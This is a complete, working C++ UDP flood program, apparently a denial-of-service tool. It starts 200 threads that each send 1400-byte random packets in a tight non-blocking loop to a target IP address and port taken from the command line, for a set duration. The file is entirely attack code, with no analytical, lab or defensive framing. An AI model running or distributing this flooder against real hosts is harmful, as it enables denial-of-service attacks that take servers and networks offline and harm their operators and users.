#include <iostream>
#include <vector>
#include <thread>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <ctime>
#include <fcntl.h>

using namespace std;

char global_payload[1400];

void prepare_payload() {
    for (int i = 0; i < 1400; i++) {
        global_payload[i] = (char)(rand() % 256);
    }
}

void attack(string ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    fcntl(sock, F_SETFL, O_NONBLOCK);
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

    time_t end = time(NULL) + duration;
    while (time(NULL) < end) {
        sendto(sock, global_payload, 1400, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        sendto(sock, global_payload, 1400, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) return 1;
    srand(time(NULL));
    prepare_payload();

    string target_ip = argv[1];
    int target_port = stoi(argv[2]);
    int duration = stoi(argv[3]);

    int threads_count = 200; 
    vector<thread> threads;
    for (int i = 0; i < threads_count; i++) {
        threads.push_back(thread(attack, target_ip, target_port, duration));
    }
    for (auto &t : threads) if (t.joinable()) t.join();

    return 0;
}